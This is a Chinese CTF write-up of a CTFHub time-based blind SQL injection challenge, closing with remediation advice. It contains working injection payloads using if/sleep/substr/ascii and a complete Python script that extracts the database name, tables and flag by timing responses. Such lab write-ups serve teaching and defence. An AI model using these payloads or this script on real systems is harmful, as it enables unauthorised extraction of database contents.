# CTFHub Writeup - 时间盲注 

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - 时间盲注 |
| 靶场地址 | `http://challenge-1b5aadc47497a110.sandbox.ctfhub.com:10800` |
| 注入参数 | GET `id` |
| 数据库 | `sqli` |
| 目标数据 | `sqli.flag.flag` |
| 判定方式 | 响应时间（`sleep` 是否被触发） |
| Flag | `ctfhub{7e4a5a4fff981ee04eaa3433}` |
## 0x02 漏洞原理
时间盲注是「盲注」里最极端的一种。
布尔盲注至少还能看到页面内容的差异，而时间盲注的页面完全不给你任何反馈：不管 SQL 执行成功还是失败，返回的都是同一个页面，状态码一样，长度也一样。本题首页下面直接写着「什么都不返回，试试吧」，就是这个意思。
既然页面没有差异，就只能从「服务器处理这次请求花了多久」来判断真假。
做法是构造这样的语句：
```sql
1 and if(条件, sleep(2), 0)
```
条件为真时，数据库会睡眠 2 秒，HTTP 响应就明显变慢；条件为假时，立刻返回。攻击者只要掐表，就能得到一个「是 / 否」的回答。
**为什么慢**
每次请求只能回答一个真假问题。想拿到一个字符，要先用 `ascii()` 把它变成数字，再用二分法一次次逼近，通常 7 次左右；flag 有 32 个字符，加上库名、表名、字段名，总请求量在 300 次以上，跑几分钟很正常。
**关键函数**
- `if(条件, 真值, 假值)`：MySQL 的三元表达式，用来控制是否触发延时；
- `sleep(n)`：让数据库睡眠 n 秒；
- `substr(str, pos, 1)`：取第 pos 个字符；
- `ascii(char)`：取字符的 ASCII 码，方便做数值比较；
- `length(str)`：先问长度，确定循环次数。
## 0x03 解题过程
**3.1 确认注入点与延时**
首页是一个查询框，GET 传参 `id`。先看正常请求和带 `sleep` 的请求分别耗时多少：
```
id=1                      -> 0.21s
id=1 and sleep(2)         -> 2.19s
id=1 and sleep(0)         -> 0.20s
```
`id=1 and sleep(2)` 明显慢了 2 秒，说明 `id` 处的输入确实被带进 SQL 执行，存在注入，而且可以用时间作为判断依据。
**3.2 构造可用的判定语句**
为了能按条件触发延时，把 `sleep` 包进 `if` 里：
```
id=1 and if(1=1,sleep(0.6),0)   -> 0.87  0.83  0.81
id=1 and if(1=2,sleep(0.6),0)   -> 0.19  0.20  0.18
```
真条件稳定在 0.8 秒以上，假条件稳定在 0.2 秒左右，区分度很好。后续脚本就以 0.6 秒作为阈值：响应时间超过 0.6 秒判定为真，低于 0.45 秒判定为假，落在中间的重新请求一次。
**3.3 判断库名长度**
先用 `length()` 二分出数据库名的长度：
```
id=1 and if(length(database())>=n,sleep(0.6),0)
```
不断调整 n，最终确定长度为 4。
**3.4 逐字符猜库名**
长度已知，开始逐位猜字符。以第 1 位为例：
```
id=1 and if(ascii(substr(database(),1,1))>64,sleep(0.6),0)
id=1 and if(ascii(substr(database(),1,1))>96,sleep(0.6),0)
id=1 and if(ascii(substr(database(),1,1))>112,sleep(0.6),0)
```
按响应时间判断区间，二分几次后确定 ASCII 码为 115，也就是字符 `s`。把下标从 1 到 4 跑完，得到库名：
```
sqli
```
**3.5 爆表名和字段名**
有了库名，用同样的方法问 `information_schema`，表名用 `group_concat()` 拼成一个字符串再逐字符猜：
```sql
select group_concat(table_name)
from information_schema.tables
where table_schema=database()
```
得到：
```
flag,news
```
目标是 `flag` 表。继续问字段名：
```sql
select group_concat(column_name)
from information_schema.columns
where table_schema=database() and table_name='flag'
```
字段名也是 `flag`。
**3.6 取出 flag**
最后对 `select flag from flag` 的返回值逐字符猜。脚本的核心只有三件事：发请求并计时、二分猜字符、循环取整串。
```python
import time, urllib.parse, urllib.request
BASE = "http://challenge-1b5aadc47497a110.sandbox.ctfhub.com:10800/"
def cond(expr):
    url = BASE + "?" + urllib.parse.urlencode(
        {"id": "1 and if((%s),sleep(0.6),0)" % expr})
    for _ in range(3):
        t0 = time.time()
        urllib.request.urlopen(url, timeout=30).read()
        dt = time.time() - t0
        if dt > 0.60:
            return True
        if dt < 0.45:
            return False
    return False
def length_of(expr):
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond("length((%s))>=%d" % (expr, mid)):
            lo = mid
        else:
            hi = mid - 1
    return lo
def char_at(expr, pos):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if cond("ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)
def dump(expr):
    return "".join(char_at(expr, i) for i in range(1, length_of(expr) + 1))
```
运行结果：
```
sqli
flag,news
flag
ctfhub{7e4a5a4fff981ee04eaa3433}
```
**3.7 验证**
把猜出来的值直接放进等式里再问一次：
```
id=1 and if((select flag from flag)='ctfhub{7e4a5a4fff981ee04eaa3433}',sleep(0.6),0)
```
响应确实变慢，说明 flag 正确。
## 0x04 完整流程
| 步骤 | 判断语句 | 结果 |
| --- | --- | --- |
| 库名长度 | `if(length(database())>=n,sleep(0.6),0)` | 4 |
| 库名 | `if(ascii(substr(database(),i,1))>n,sleep(0.6),0)` | `sqli` |
| 表名 | `group_concat(table_name)` 逐字符 | `flag,news` |
| 字段名 | `group_concat(column_name)` 逐字符 | `flag` |
| flag | `if(ascii(substr((select flag from flag),i,1))>n,sleep(0.6),0)` | `ctfhub{7e4a5a4fff981ee04eaa3433}` |
整条链路可以概括为：**用 `length()` 定长度，用 `substr()` 定位，用 `ascii()` 转数字，用 `if(...,sleep(n),0)` 把「真假」变成「快慢」，最后用二分法收敛。**
## 0x05 踩坑记录
1. **不能靠页面判断真假**：本题不管 payload 对错，返回的 HTML 完全一样，状态码都是 200。唯一可用的信号是耗时，所以脚本必须自己计时，不能去匹配页面内容。
2. **延时值要选得合适**：太短（如 0.1 秒）会被网络抖动淹没，太长（如 5 秒）会让总耗时爆炸。0.5 到 1 秒是比较好的区间，本题用 0.6 秒，真假差距约 0.65 秒，很好区分。
3. **阈值要留余量**：真实环境有波动，别把阈值卡在 0.45 秒这种临界值，最好设一个「不确定就重试」的区间。
4. **必须用二分法**：如果从 ASCII 32 挨个试到 126，一个字符最多要 95 次请求，32 个字符就是 3000 次，按每次 0.6 秒算要半小时以上。二分只要 7 次左右。
5. **数字型不需要引号**：本题 `id` 是数字型，直接 `1 and if(...)` 即可；照抄字符型的 `1' and ...` 会多一个引号，SQL 直接语法报错，永远不会延时。
6. **注意 `sleep` 的位置**：`1 and sleep(2)` 是一定会延时的，只适合验证注入存在；真正取值必须用 `if` 把延时和条件绑定，否则每次请求都慢，无法判断真假。
7. **请求要加重试**：几百次请求里总会有超时或连接重置，`try/except` 加重试能避免脚本中途崩掉；也不要并发太高，容易被限流。
## 0x06 修复建议
1. **使用预编译（参数化查询）**：`PDO` 的 `prepare/execute` 或 `mysqli` 预处理，把 `id` 作为参数绑定，注入从根上消失。
2. **对输入做类型校验**：`id` 应该是整数，用 `intval()` 强转或正则限制为纯数字。
3. **限制数据库执行时间**：设置 `max_execution_time`，并避免 Web 账号拥有执行 `sleep` 之外的高权限。
4. **关闭详细报错**：`display_errors=Off`，错误只写日志，不返回给前端。
5. **最小权限**：Web 应用不要用 root 连库，只授予业务所需的 `SELECT` 权限。
6. **WAF 兜底**：对 `sleep`、`benchmark`、`if(`、`substr` 等关键字做拦截，对异常慢请求做监控告警。
## 0x07 总结
时间盲注是布尔盲注的「无回显版本」：页面连真假都不告诉你，只能靠服务器卡不卡来判断。
它的技术门槛不高，难的是耐心和细节：延时值要够长、阈值要留余量、必须用二分法、请求要加重试。本题 flag 只有 32 个字符，但完整跑一遍要三百多次请求、好几分钟，这也说明盲注类题目真正拼的是脚本质量和稳定性。
